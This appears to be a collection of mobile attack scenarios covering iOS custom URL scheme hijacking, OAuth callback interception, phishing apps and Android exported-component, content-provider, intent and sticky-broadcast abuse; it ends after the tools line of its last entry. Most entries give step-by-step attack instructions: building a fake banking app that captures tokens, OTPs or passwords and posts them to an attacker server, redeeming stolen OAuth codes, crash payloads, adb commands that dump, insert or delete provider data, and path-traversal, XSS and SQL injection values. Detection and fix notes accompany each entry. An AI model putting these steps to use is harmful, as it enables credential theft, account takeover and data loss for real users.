Title: iOS URL Scheme Hijacking via Malicious App
Scenario Description: iOS applications can define custom URL schemes like bankapp://, mywallet://, or payment:// to allow other apps or web pages to open them directly. But if two apps register the same scheme, iOS gives access to the one installed most recently. A malicious app can define the same URL scheme as a legitimate app (like a banking or wallet app), and if the user installs this malicious app later, it will silently hijack any data sent via that scheme. This allows the malicious app to intercept login tokens, OTPs, session URLs, or sensitive info that the legitimate app was expecting.
Tools Used: Xcode, iPhone or iOS Simulator, iOS Device with Safari, Burp Suite (optional), Frida (optional)
Attack Steps: First, understand how iOS custom URL schemes work. These are like shortcuts that let apps be opened from web links or other apps using formats like bankapp://. They are set in the app’s Info.plist file and used to handle things like login, payments, or session links.Choose a real app that uses a custom URL scheme and handles sensitive information (e.g., wallet://, bankapp://, paymentapp://). You can find this from the app's documentation, or by monitoring link redirects in Safari or OAuth login flows.Open Xcode and create a new iOS app project. In your Info.plist file, add the same URL scheme that the legitimate app uses. You do this by adding a new URL Types entry with a URL Schemes array that includes, for example, bankapp.Write Swift or Objective-C code in your app to handle all URLs that use this scheme. In your AppDelegate.swift file, implement the method: func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool. In this method, print out or log the full URL the app receives.Run or install this app on your iPhone or iOS Simulator after the real app. iOS gives priority to the most recently installed app for handling a URL scheme. Now your malicious app owns the bankapp:// scheme even though the real bank app used it first.In Safari, type in a test link: bankapp://auth?token=secret123&otp=4567. This simulates a redirect from a website or email link that would normally go to the real app.Your malicious app will open automatically, and the AppDelegate method will receive the full link, letting you steal token=secret123 and otp=4567.You can log this sensitive information to a local file or send it to your own server for further misuse, like impersonating the user in another app or stealing session data.The real bank app never opens, and the user may not even notice. The attacker now controls sensitive information, all because iOS didn’t protect the scheme and allowed the last app installed to override it.This is 100% real and works on iOS apps unless developers switch to Universal Links which do not have this issue.
Target Type: iOS Applications using Custom URL Schemes
Vulnerability: Lack of ownership protection over custom URL schemes in iOS
Impact: Leakage of sensitive user data (session tokens, login credentials, OTPs) to attacker
Detection Method: Use a jailbroken iOS device or Frida to monitor actual URL scheme invocations. Also, static analysis of installed apps can reveal duplicated schemes. Dynamic instrumentation with Frida can confirm hijack attempts.
Solution: Developers must use Universal Links instead of custom schemes for sensitive actions. Apple should enforce scheme ownership. Users should not install unknown apps that request unusual permissions or define sensitive schemes.
Tags: iOS, URL Scheme Hijack, Frida, Data Interception, Mobile Security

Title: Fake App as URL Scheme Handler to Hijack OAuth Login Callback
Scenario Description: iOS apps often use OAuth-based login (e.g., Google, Facebook, Microsoft). After the user logs in through a browser or webview, the server redirects to a custom scheme like mybank://auth?code=XYZ to return the token back to the app. If a malicious app registers the same scheme, it can receive that callback instead of the real app. The attacker builds a fake app, registers the same scheme, and tricks the user into installing it. Now any login callback gets redirected to the attacker's app. Sensitive login codes or tokens get intercepted, allowing full hijack of accounts.
Tools Used: Xcode, iPhone or iOS Simulator, Safari, Frida (optional), Charles Proxy or Burp Suite, OAuth Playground (for testing)
Attack Steps: First, you need to understand that iOS apps often use custom URL schemes for OAuth login (e.g., logging in with Google or a bank account). After login, the browser or web page redirects to a URL like mybank://auth?code=abc123. This link opens the mobile app, and the app uses the code to finish login.As an attacker, you create a fake iOS app using Xcode. You go to the app’s Info.plist and register the same URL scheme that the target app uses. For example, if the banking app uses bankapp://, your fake app also registers bankapp.Inside your fake app, write a method called application(_:open:options:). This is the method that receives URLs from the system. Here, print the entire URL and store the code inside.Install your fake app on a device after the real app. iOS always gives the most recently installed app priority when two apps use the same URL scheme.Now perform a real OAuth login from a website or test app that uses the bankapp://callback?code=abc123 redirect. After login, the login server sends the user back to this URL.iOS launches your fake app instead of the real app. Your app gets full access to the URL, including the code=abc123.Now use Postman or any REST client to send this code to the OAuth server's token endpoint (e.g., https://login.bank.com/token) to exchange the code for an access token. This access token gives full access to the victim’s account.The fake app can display a blank screen, crash, or show “login error.” The victim might retry login, not knowing their account was already hijacked.From your attacker's server, you now have an active session and full access to the user’s bank or app account.This works 100% in real life if the target app uses a custom URL scheme (not Universal Links) and the user installs your app afterward. It’s invisible, silent, and very dangerous.
Target Type: iOS Applications using OAuth via URL Schemes
Vulnerability: iOS does not restrict URL scheme ownership, and allows silent hijack of login callbacks by same-scheme apps
Impact: Attacker gains full account access by intercepting OAuth tokens meant for legitimate app
Detection Method: Monitor scheme redirects using Charles Proxy or Burp Suite. Use Frida or jailbroken device to log callback invocations. Review installed apps for duplicate scheme usage.
Solution: Use Universal Links instead of custom schemes for OAuth login callbacks. Universal Links are tied to domains and cannot be hijacked by other apps. Always validate the state parameter in OAuth to detect tampering.
Tags: OAuth Hijack, iOS, URL Scheme, Callback Interception, Mobile Security

Title: iOS Phishing App Triggered via Hijacked URL Scheme
Scenario Description: On iOS, apps can register custom URL schemes like bankapp:// to be opened by browsers or other apps. When a legitimate website or deep link triggers this scheme, iOS opens the app that registered it. If an attacker builds a fake app that registers the same scheme and tricks the user into installing it after the real app, the fake app will open instead. The fake app shows a fake login screen that looks identical to the real app. The user thinks they are logging into the real app, but they're entering credentials into the phishing app. This is invisible to the user and works even without elevated permissions.
Tools Used: Xcode, iPhone or iOS Simulator, Safari (or any browser), Frida (optional), Charles Proxy or Burp Suite (for traffic testing), Apple Developer Account (for testing install)
Attack Steps: Understand how iOS URL schemes work. A URL like bankapp://login is designed to open a specific app (like a bank app) on the iPhone. If any app registers the same scheme (bankapp), iOS opens that app instead. It doesn’t check if the app is real or fake.Open Xcode and create a new iOS app. This is your phishing app. In the Info.plist, add a new URL scheme. Use the same scheme as the real banking app (e.g., bankapp).Now design a fake login screen. Use Interface Builder (Storyboard) to drag and drop a label ("Welcome to BankApp"), two text fields (for username and password), and a login button. Try to copy the same layout, colors, and logo from the real app. You don’t need to code anything complex.Add code so that when the login button is pressed, it logs the entered username and password to the console or sends it to your server. You can do this with a simple HTTP POST request to a test server like RequestBin or your own web server.In the AppDelegate file, implement the function application(_:open:options:) to capture any incoming scheme-based URLs. This is how the app knows it was opened by a URL like bankapp://login.Build and install this phishing app on your iPhone or simulator. Install it after the real app so that your fake app now owns the bankapp:// scheme.Test the attack. Open Safari and type in the URL: bankapp://login. Press enter. iOS opens your phishing app, because your app now handles that scheme.The user sees your fake login screen. If they enter their credentials, your app steals them silently — either by saving them or sending them to your server.You now have the victim’s real credentials. The app can show a fake “Login failed” message so the user doesn't realize what just happened. Meanwhile, you can log into their real bank account using the stolen credentials.This attack works in real life and is invisible. The user does not see any alerts. iOS just opens your app like normal. As long as your app looks similar to the original, the user won’t realize it’s fake.
Target Type: iOS Applications using Custom URL Schemes
Vulnerability: iOS allows last-installed app to claim URL scheme without validation
Impact: User credentials are phished silently by impersonating legitimate apps via hijacked URL triggers
Detection Method: Use Frida or Charles Proxy to intercept network calls. Check installed apps for overlapping URL schemes using mobile security tools like MobSF.
Solution: Use Universal Links with domain verification instead of custom schemes. Apple should enforce scheme ownership per app. Users should avoid installing unknown apps and double-check permissions.
Tags: Phishing, iOS, URL Scheme Hijack, Credential Theft, Mobile Security

Title: Cross-App Denial of Service or Crash via Malformed URL Scheme
Scenario Description: iOS apps that register custom URL schemes can crash or hang if they receive malformed or unexpected inputs from external apps or Safari. If an attacker crafts a specific URL (e.g., bankapp://%00%00%00%00) with unexpected encoding or long payloads, and then triggers it through a browser or another app, the target app may crash, freeze, or be forced to close. If done repeatedly, it can create a persistent denial-of-service condition on the victim’s device. This is dangerous when targeting apps like banking, messaging, or secure communication tools.
Tools Used: Xcode, Safari or Mail App on iPhone, iOS Device or Simulator, Frida (optional), Burp Suite or Charles Proxy (optional)
Attack Steps: First, understand that iOS apps can register something called a custom URL scheme, like bankapp://. This lets links from Safari, Email, or other apps open that app directly. When you click on bankapp://login, iOS checks for an app that registered bankapp and opens it.You want to target an app that’s installed on your iPhone or iOS Simulator — for example, a banking app, wallet app, or even a messaging app that uses these schemes. You don’t need to reverse engineer the app — just find or guess its scheme. You can try appname://.Once you know the scheme (like bankapp://), your goal is to break the app by sending it unexpected input through a malformed or corrupted URL. This means you’ll craft a URL that’s either too long, missing expected parameters, has wrong formatting, or uses special characters like %00. Example of malformed URLs: bankapp://%00%00 (null bytes), bankapp://crash?=%x%x%x%x%x (format string), bankapp:// followed by 1000+ characters (overflow test)Open Safari, Notes, or Email on your device. Paste the crafted link. Tap on it. iOS will try to open the app with the registered scheme. If the app doesn’t protect itself, it will receive the malformed URL and try to process it.Many apps don’t check for unexpected input and will try to use it directly. This can cause the app to crash instantly, freeze, or behave strangely. This is because the app wasn’t expecting such weird input and doesn’t know how to handle it.Now keep experimenting with different malformed URLs. Try empty links like bankapp://, extremely long links with repeated characters like bankapp://AAAA..., or broken encoding like bankapp://%GG%ZZ.If the crash happens repeatedly, you can make the DoS attack persistent by storing this URL in a QR code, sending it in an SMS/email, or embedding it in a webpage. Every time the user clicks it, the target app opens and crashes again.In older apps or poor implementations, the crash can happen every time the app is opened (if it tries to reprocess the last URL), leading to a loop where the user cannot open the app anymore unless it’s deleted.You can use tools like Frida (advanced) or Console.app on your Mac (simple) to view crash logs or monitor how the app fails. But even without tools, just opening the URL and watching the app crash is enough to prove the attack.
Target Type: iOS Applications using Custom URL Schemes
Vulnerability: No input validation on custom URL handlers, leading to DoS/crashes from malformed input
MITRE Technique: T1499.001 – Endpoint Denial of Service: Application or System Exploitation
Impact: App crash or freeze, denial of service for the user, persistent crash loop
Detection Method: Use logs (Console.app on Mac), Frida, or Charles Proxy to observe malformed URL triggering. Test various payloads in a controlled test app.
Solution: Apps must sanitize and validate all scheme inputs before processing. Use length checks, encoding filters, and reject unknown parameters. iOS should restrict malformed scheme formats.
Tags: iOS, URL Scheme, DoS, Malformed Input, Mobile Security

Title: Triggering Sensitive Actions via Deep Links in Hijacked iOS App
Attack Type: Unauthorized Action via Deep Link Scheme
Scenario Description: iOS apps often use deep links with custom URL schemes like bankapp://pay?amount=1000&to=xyz to allow features such as payments, balance checks, profile access, or password resets directly from URLs. If an attacker creates a malicious app that registers the same scheme and includes handler code for these links, then installs it after the real app, the system will launch the attacker’s app instead. If the victim opens a deep link from an email, message, or QR code, thinking it's for their legitimate app, the malicious app will instead perform sensitive or destructive actions (like fake money transfers, profile changes, app manipulation, or account tampering).
Tools Used: Xcode, Safari or Notes on iOS, iOS Simulator or Physical iPhone, Frida (optional), Charles Proxy or Burp Suite (optional)
Target Type: iOS Apps Using Custom Schemes for Payments or Actions
Vulnerability: No source validation or ownership protection of deep link handlers in custom URL schemes
MITRE Technique: T1201 – Shared Modules; T1557.002 – Interception via Application Layer Protocol
Impact: Unauthorized or fake transactions, privacy invasion, spoofed actions, or stolen user interaction
Detection Method: Use logging tools (Frida, Console.app, Charles Proxy) to watch for unexpected scheme invocations. Check for duplicate scheme apps installed.
Solution: Always use Universal Links with domain-based validation. Developers must validate link source, user identity, and include state or CSRF tokens. Users should avoid unknown apps with overlapping scheme names.
Tags: Deep Link Abuse, iOS, URL Scheme, Action Hijack, Phishing, Mobile Security

Title: Circumventing iOS App Sandboxing via URL Scheme Hijacking
Scenario Description: iOS apps are sandboxed, meaning one app cannot directly access another app’s private files, memory, or data. However, if apps use URL schemes (appname://data) to pass data or trigger actions, a malicious app can exploit this mechanism to indirectly access or intercept sensitive content, bypassing some sandbox isolation. If one app trusts the source of a deep link and performs privileged operations (e.g., file access, account switch, token exposure), a fake app can hijack that link or manipulate the flow to gain access to data not meant for it. This bypasses the sandbox indirectly, by tricking the target app to act on the attacker’s behalf.
Tools Used: Xcode, iOS Simulator or iPhone, Safari or Notes, Charles Proxy (optional), Frida (optional), MobSF (optional for static analysis)
Attack Steps:
First, understand that iOS sandboxing means every app has its own locked folder — one app cannot open another app’s files. But apps can talk to each other using deep links (like fileshareapp://download?file=secret.txt). This opens a path to trick the app.Find a real iOS app that uses deep links to trigger internal functions like file access, account switching, token sharing, or export. Apps like document editors, cloud storage apps, or communication tools often have such schemes.Try typing their URL scheme (like fileshareapp://view?file=...) in Safari or Notes. If it opens the app and performs an action, that’s a potential entry point.Now create your own app in Xcode. In Info.plist, declare the same scheme:
<key>CFBundleURLTypes</key>
<array>
  <dict>
    <key>CFBundleURLSchemes</key>
    <array>
      <string>fileshareapp</string>
    </array>
  </dict>
</array>
In AppDelegate.swift, handle incoming URLs using this code:
func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
    print("Received URL: \(url)")
    // Extract and log sensitive info from the URL
    return true
}
Install your app after the real app so that iOS routes any fileshareapp:// URLs to your app instead of the legit one.Now create deep links used by the target app (example: fileshareapp://open?file=/private/secret1.txt) and trigger them from Safari.If your app opens and receives this data, you’ve successfully intercepted info meant for another app — like a filename, path, or token. Even though you don’t access the file directly, you now know its name and path, which breaks the sandbox boundary.Optionally, forward the received URL data back to the real app using Universal Links, clipboard, or inter-process communication, chaining the hijack to cause confusion or manipulation.This way, your app circumvents iOS sandboxing not by directly stealing files, but by fooling a legitimate app or user into leaking sensitive data through insecure deep links.
Target Type: iOS Apps using Deep Linking or Inter-App URLs
Vulnerability: Improper validation of deep link source, allowing data exposure or action triggering via hijack
Impact: Unauthorized access to internal data paths, potential file exposure, session token leak
Detection Method: Monitor app URL scheme usage via Frida or iOS logs. Scan for registered schemes using MobSF. Observe for suspicious app behavior handling schemes not originally theirs.
Solution: Apps should validate source of incoming URL (via sourceApplication), avoid sensitive actions from links, and use Universal Links instead. Avoid passing file paths or tokens in plain URLs.
Tags: Sandbox Bypass, Deep Link Hijack, iOS URL Scheme, App Isolation, Mobile Security

Title: Launching Exported Activities Without Authorization
Scenario Description: Many Android apps define Activities in their manifest as exported="true", intentionally or accidentally. If no proper permission or authentication checks are placed, these exported Activities can be launched by malicious apps or ADB, allowing attackers to access internal app functions, sensitive data screens, or privileged features. This flaw allows unauthorized use of sensitive screens or actions, such as launching admin panels, payment interfaces, debug tools, or hidden features.
Tools Used: Android Studio, APKTool, adb, Emulator/Rooted Device, jadx-gui
Attack Steps: 1. Install a sample vulnerable app or use a test APK on an emulator or rooted device (you can also use your own target app). 2. Use adb shell pm list packages to get the package name of the target app. For example, com.example.vulnerableapp. 3. Use jadx-gui or APKTool to decompile the APK and open AndroidManifest.xml to locate <activity> tags that include android:exported="true" or have no restriction like android:permission. These are potentially accessible externally. 4. Choose one of the exported activity names like com.example.vulnerableapp.AdminDashboardActivity. 5. Open terminal and launch that Activity using the following command: adb shell am start -n com.example.vulnerableapp/com.example.vulnerableapp.AdminDashboardActivity. 6. If the activity launches without any restriction or login prompt, you have successfully triggered the vulnerability. You can also automate this via a custom malicious app that silently starts this activity in background. 7. To confirm impact, explore what functionality this activity exposes — it could allow unauthorized transactions, view/edit private data, or access admin-only screens. 8. If the exported activity accepts Intent extras, try passing additional data to test for deeper exploitation, like: adb shell am start -n com.example.vulnerableapp/com.example.vulnerableapp.AdminDashboardActivity --es role "admin". 9. Document the behavior and take screenshots to verify proof of concept. 10. Optionally, build a demo malicious app with an Intent to launch this activity programmatically using: Intent i = new Intent(); i.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.AdminDashboardActivity")); startActivity(i);. This simulates how a malicious app can exploit it without ADB.
Impact: Unauthorized access to internal app screens, potential privilege escalation or data leakage
Detection Method: Static analysis of manifest + runtime test using adb or dynamic instrumentation
Solution: Add android:exported="false" or restrict with android:permission + check session/login state in code
Tags: mobile, android, exported-activity, misconfiguration, no-auth-check, beginner, adb, pen-test
Source: CWE-926, OWASP MASVS, MITRE ATT&CK Mobile T1437

Title: Triggering Exported Services
Scenario Description: Android apps often define Service components in their manifest to perform background tasks like data syncing, file uploading, logging, or processing messages. If these services are marked as exported="true" and not protected with permissions or authentication, they can be invoked by other apps or ADB without any restrictions. This means an attacker can silently trigger sensitive background operations, send fake data to the service, or cause unintended behaviors like crashing, leaking logs, resetting passwords, or initiating transactions.
Tools Used: Android Studio, APKTool, adb, jadx-gui, Android Emulator or Rooted Phone
Attack Steps: 1. First install a vulnerable app or any sample app (APK) on your Android emulator or rooted device. You can use public vulnerable apps like InsecureBankv2 or make your own simple app with exported services. 2. Use adb shell pm list packages to list all installed apps and note the package name of your target app. Example: com.example.vulnerableapp. 3. Use APKTool (apktool d app.apk) or jadx-gui to decompile the app and read the AndroidManifest.xml file. 4. In the manifest, search for <service> components. If any service has android:exported="true" or no permission set, it may be vulnerable. Example: <service android:name=".UploadService" android:exported="true"/>. 5. Choose the exported service class name. For example, com.example.vulnerableapp.UploadService. 6. Open terminal and trigger the service using ADB with this command: adb shell am startservice -n com.example.vulnerableapp/com.example.vulnerableapp.UploadService. 7. If the service starts successfully and no errors or permissions are required, it means you have triggered the service without authorization. 8. To go deeper, if the service accepts input via intent extras, you can pass data with the command like this: adb shell am startservice -n com.example.vulnerableapp/com.example.vulnerableapp.UploadService --es "filename" "secret.txt". 9. Monitor the Logcat using adb logcat to check what the service does—does it upload files? sync data? show logs? This helps understand impact. 10. For automation, you can write a custom malicious app that sends an Intent to start the service in background using: Intent intent = new Intent(); intent.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.UploadService")); context.startService(intent);. This simulates a real attack where an attacker’s app silently triggers the service. 11. If the service performs privileged tasks (like resetting user data, sending SMS, changing settings, or uploading logs), the attacker can abuse that functionality. 12. Take screenshots, log output, and document the service behavior for reporting or demo purposes. This confirms that exported services are a serious risk.
Impact: Silent abuse of internal background features, potential data leak or crash, denial-of-service
Detection Method: Static analysis of manifest + runtime testing via adb or test app
Solution: Mark services as android:exported="false" unless needed; apply android:permission; add runtime session/auth check inside the service
Tags: android, exported-service, mobile, misconfiguration, no-auth, pentesting, adb, background-service
Source: CWE-926, OWASP MASVS, MITRE ATT&CK Mobile T1437

Title: Broadcast Receiver Hijacking
Scenario Description: Android apps can register Broadcast Receivers to listen for system-wide or app-specific events (like BOOT_COMPLETED, SMS_RECEIVED, CUSTOM_ACTION, etc.). If a receiver is declared with android:exported="true" in the manifest or dynamically registered without proper checks, any external app (including a malicious one) can send crafted fake broadcasts to that receiver, causing the app to behave unexpectedly, crash, leak data, or perform unintended actions. This is known as Broadcast Hijacking, and it is a commonly exploited weakness in many apps.
Tools Used: Android Studio, APKTool, adb, jadx-gui, Emulator/Rooted Device
Attack Steps: 1. First install a vulnerable app or test app (e.g., from GitHub or intentionally vulnerable APKs like InsecureBankv2) on an Android emulator or rooted phone. 2. Use adb shell pm list packages to get the target package name. Example: com.example.vulnerableapp. 3. Use jadx-gui or apktool to decompile the APK and open AndroidManifest.xml. Search for <receiver> tags. Look for receivers that have android:exported="true" or lack permission restrictions. Example: <receiver android:name=".MyReceiver" android:exported="true"> <intent-filter> <action android:name="com.example.vulnerableapp.TRIGGER_ACTION"/> </intent-filter> </receiver>. 4. Note the action name (e.g., com.example.vulnerableapp.TRIGGER_ACTION) and full class name of the receiver (e.g., com.example.vulnerableapp.MyReceiver). 5. Now craft and send a fake broadcast using ADB: adb shell am broadcast -a com.example.vulnerableapp.TRIGGER_ACTION -n com.example.vulnerableapp/.MyReceiver. 6. If the receiver gets triggered without any authentication or permission check, the vulnerability is confirmed. You can watch the log with adb logcat to observe what the broadcast triggers — it may write to log, start a service, send a message, or access sensitive resources. 7. If the receiver accepts additional data (Intent extras), you can inject values using: adb shell am broadcast -a com.example.vulnerableapp.TRIGGER_ACTION --es "data" "malicious_value". This can further manipulate the receiver’s logic. 8. To automate the attack, build a malicious Android app that sends the same broadcast via code: Intent i = new Intent(); i.setAction("com.example.vulnerableapp.TRIGGER_ACTION"); i.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.MyReceiver")); sendBroadcast(i);. 9. Observe the behavior. If the receiver performs privileged operations (like enabling features, modifying data, starting services), this can be exploited to cause denial of service, privilege escalation, or information leakage. 10. Document the behavior, impact, and log outputs. You’ve now successfully hijacked a broadcast receiver. This is a real vulnerability seen in many popular Android apps, especially older ones.
Impact: Malicious app or attacker can send fake broadcasts, trigger privileged functionality, cause crashes or unauthorized behavior
Detection Method: Static manifest analysis + dynamic testing using ADB or malicious test app
Solution: Mark receivers android:exported="false" unless needed; validate intent origin and apply android:permission to secure it; always validate extras in code
Tags: android, broadcast-hijack, mobile, adb, misconfiguration, exported, zero-permission
Source: CWE-926, OWASP MASVS, MITRE ATT&CK Mobile T1437

Title: Abusing Content Providers
Scenario Description: Android apps use Content Providers to store and share data like files, contacts, user info, or logs. These components expose data through content:// URIs. If a content provider is marked as exported="true" or lacks proper permission controls, any app or attacker can access, read, write, delete, or inject data using standard tools like content command in ADB or custom malicious apps. This is one of the most dangerous issues because it allows full database access, leading to data theft, modification, or abuse of internal app logic.
Tools Used: Android Studio, ADB, jadx-gui, apktool, Emulator/Rooted Device
Attack Steps: 1. First install a vulnerable app on your emulator or test phone. You can use any APK from GitHub or sample apps that expose a content provider. Example: InsecureBankv2 or a custom test app. 2. Use adb shell pm list packages to get the app’s package name. Example: com.example.vulnerableapp. 3. Decompile the APK using jadx-gui or apktool (apktool d app.apk) and open the AndroidManifest.xml. 4. Search for <provider> tags. Look for providers that have android:exported="true" or no permission restrictions like android:permission, readPermission, or writePermission. Example: <provider android:name=".UserDataProvider" android:authorities="com.example.vulnerableapp.provider" android:exported="true"/>. 5. Get the content URI from the authorities attribute. Example URI: content://com.example.vulnerableapp.provider/users. 6. Now test if you can read data using ADB: adb shell content query --uri content://com.example.vulnerableapp.provider/users. 7. If this shows user data like usernames, passwords, or tokens, the provider is vulnerable. 8. Try inserting new data (abuse): adb shell content insert --uri content://com.example.vulnerableapp.provider/users --bind username:s:'attacker' --bind password:s:'hacked'. 9. Try deleting sensitive records: adb shell content delete --uri content://com.example.vulnerableapp.provider/users. 10. Monitor adb logcat to see if the app reacts — crashes, processes the data, or syncs it to server. 11. Build a custom malicious app with code to query the provider: Cursor c = getContentResolver().query(Uri.parse("content://com.example.vulnerableapp.provider/users"), null, null, null, null); while(c.moveToNext()){ Log.d("leak", c.getString(0)); }. This allows you to automate data extraction. 12. If the provider supports custom parameters or file access (like content://.../files/image.jpg), try downloading the files using adb shell content read --uri content://.... 13. Try SQL injection via URI or parameters (e.g., passing " OR 1=1--" as a query). 14. Document all successful read, write, delete, or modify operations. You’ve now successfully exploited a real-world Content Provider vulnerability without needing root or special access. This issue is widespread and seen in many real apps, especially those using SQLite and Room database internally.
MITRE Technique: T1409 – Access Sensitive Data via Local Inter-Process Communication
Impact: Full data exposure, injection, modification, data loss, app manipulation
Detection Method: Manual manifest analysis + runtime tests with content ADB commands or malicious app
Solution: Always define android:exported="false" unless needed, use android:permission, readPermission, writePermission, and verify calling UID in code
Tags: android, contentprovider, exported, data-leak, adb, mobile, database, injection
Source: CWE-200, CWE-276, OWASP MASVS, MITRE ATT&CK Mobile T1409

Title: Intent Injection
Scenario Description: In Android, Intents are used to pass data and control between different components (Activities, Services, BroadcastReceivers). If an exported Activity or Service does not validate the incoming Intent data (extras, actions, URIs, etc.), a malicious app or user can inject fake or crafted data, causing privilege escalation, data leakage, unexpected behavior, logic bypass, or even remote code execution. This is called Intent Injection. It is especially dangerous when developers use Intent data directly in web views, file access, log statements, or SQL queries.
Tools Used: Android Studio, jadx-gui, ADB, apktool, Android Emulator
Attack Steps: 1. Install a vulnerable app (e.g., test app with exported Activity or Service) on an emulator or rooted phone. You can use apps from GitHub like InsecureBankv2 or create a simple one that receives intent data. 2. Use adb shell pm list packages to identify the target app’s package name (e.g., com.example.vulnerableapp). 3. Use apktool d app.apk or jadx-gui to decompile the app and open the AndroidManifest.xml file. 4. Look for <activity> or <service> elements with android:exported="true" and no permission checks. For example: <activity android:name=".PaymentActivity" android:exported="true"/>. This means the component can receive intents from outside apps or adb. 5. Look inside the activity/service source code to check how it handles the Intent extras. For example: String userType = getIntent().getStringExtra("role"); if(userType.equals("admin")) { showAdminPanel(); }. This is vulnerable, as it blindly trusts external input. 6. Now craft and inject a malicious intent using ADB: adb shell am start -n com.example.vulnerableapp/.PaymentActivity --es role admin. This forces the Activity to think you're an admin, and may unlock hidden features or access control. 7. If the app starts an activity with this intent and shows privileged content, the vulnerability is confirmed. 8. You can also inject other extras like: --ez isAdmin true, --ei userID 0, or even URIs: --eu file file:///sdcard/private.txt. 9. If the vulnerable component uses data from the intent in a WebView or file access, try injecting malicious data like: --es url "javascript:alert('XSS')" or --es filepath "../../../data/data/com.example.vulnerableapp/files/secret.txt". 10. Watch log output with adb logcat to confirm what the activity does with injected data. Check if it reads a file, loads something into WebView, crashes, or performs actions without proper user auth. 11. You can also build a test malicious app to trigger the same component with code: Intent i = new Intent(); i.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.PaymentActivity")); i.putExtra("role", "admin"); startActivity(i);. 12. For services, use: adb shell am startservice -n com.example.vulnerableapp/.UpdateService --es version 'rooted'. 13. Try chaining multiple extras to escalate impact: --es action "reset" --ei level 1000 --ez confirm true. 14. Document the output and screen activity. If privileged actions were performed without any session check or internal validation, the app is vulnerable to Intent Injection. 15. You have now completed a real, working Intent Injection attack. It’s one of the most overlooked issues and can be combined with others like command injection or local file access.
Vulnerability: Exported components with unvalidated Intent input
MITRE Technique: T1409 – Access Sensitive Data via Local IPC
Impact: Allows bypass of security checks, injection of malicious data, local file reading, permission abuse
Detection Method: Static code + manifest review, dynamic test with adb extras
Solution: Never trust Intent data; always check origin (UID), sanitize all extras, add permissions or android:exported="false"
Tags: android, intent-injection, exported-component, adb, injection, logic-bypass, beginner
Source: CWE-138, CWE-74, OWASP MASVS, MITRE ATT&CK Mobile T1409

Title: Sticky Broadcast Abuse
Scenario Description: In Android, Sticky Broadcasts are special types of broadcasts that stay in memory even after they are sent. This allows components (like Broadcast Receivers) to access the last broadcasted data even if they weren’t active at the time the broadcast was sent. While deprecated in newer Android versions, many legacy apps still use sendStickyBroadcast(). If a sticky broadcast is not protected with permissions or validation, a malicious app or ADB user can inject fake data using a sticky broadcast, and any component that listens for it will receive the malicious payload and react to it. This can result in unintended behaviors, logic bypass, or privilege escalation, such as spoofing system status, injecting fake app events, or forcing internal workflows.
Tools Used: Android Studio, ADB, jadx-gui, apktool, Android Emulator or Rooted Device
Attack Steps: 1. First, install a vulnerable or test app that uses sticky broadcasts. You can use intentionally vulnerable apps like InsecureBankv2, or make a simple test app where the BroadcastReceiver uses registerReceiver() and the app uses sendStickyBroadcast(). 2. Use adb shell pm list packages to get the package name of the target app (e.g., com.example.vulnerableapp). 3. Decompile the APK using apktool d app.apk or jadx-gui and inspect the code and AndroidManifest.xml. Look for receivers with android:exported="true" or receivers registered dynamically inside code (via registerReceiver) without any permissions. 4. Look for sticky broadcast actions like ACTION_DEVICE_STATUS, ACTION_SYNC_COMPLETE, or any custom action used with sendStickyBroadcast(). Example: intent.setAction("com.example.vulnerableapp.STATUS_UPDATE"); sendStickyBroadcast(intent);. 5. Now from ADB, inject a malicious sticky broadcast: adb shell am broadcast --sticky -a com.example.vulnerableapp.STATUS_UPDATE --es "status" "admin_mode_enabled". This injects fake data into the broadcast system. 6. Now reopen the target app or force its components to re-register receivers. The sticky broadcast will automatically deliver the injected value to any receiver listening for com.example.vulnerableapp.STATUS_UPDATE. 7. If the receiver uses this intent blindly (without verifying the origin), it might change app behavior. For example, it might show admin UI, disable verification, or unlock hidden features. 8. You can view the effect by restarting the app and watching adb logcat to monitor what the receiver does when it receives the injected intent. 9. You can also build a test malicious app to inject this sticky broadcast using code: Intent intent = new Intent("com.example.vulnerableapp.STATUS_UPDATE"); intent.putExtra("status", "admin_mode_enabled"); sendStickyBroadcast(intent);. 10. If the app performs privileged or security-sensitive actions based on this broadcast, the abuse is successful. 11. Try variations like: --es "user" "hacker" or --ei "sync_code" 9999 to test the app’s trust in broadcast data. 12. If the app logs sensitive behavior, syncs to server, or modifies internal states based on the sticky data, you have proven Sticky Broadcast Abuse is exploitable. 13. This abuse can persist — any new component that listens to this broadcast will receive the fake data until the device is rebooted or the sticky broadcast is cleared using removeStickyBroadcast(). 14. Document all results, screenshots, and log output to report or demonstrate the attack.
Impact: Persistent logic injection, spoofed states, unauthorized feature access, bypassed flows
Detection Method: Code review + dynamic test using adb sticky broadcasts
Solution: Never use sticky broadcasts in production; if used, apply android:permission; verify intent origin in receiver code and sanitize all inputs
Tags: android, sticky-broadcast, adb, injection, logic-bypass, mobile, beginner, broadcastreceiver
Source: CWE-927, OWASP MASVS, MITRE ATT&CK Mobile T1437

Title: Implicit Intent Hijack (Component Confusion)
Scenario Description: Android apps often use implicit intents to request actions like opening a file, sharing content, launching a camera, or downloading data. When an implicit intent is sent, Android looks for the best-matching app component (Activity, Service, etc.) to handle it. If a malicious app registers a matching intent filter, it can intercept or hijack the intent, tricking the system into launching the malicious component instead of the intended one. This is called Component Confusion or Implicit Intent Hijacking, and it can lead to data theft, phishing UI, spoofed responses, or malicious payload injection.
Tools Used: Android Studio, jadx-gui, apktool, ADB, Android Emulator, malicious APK (test)
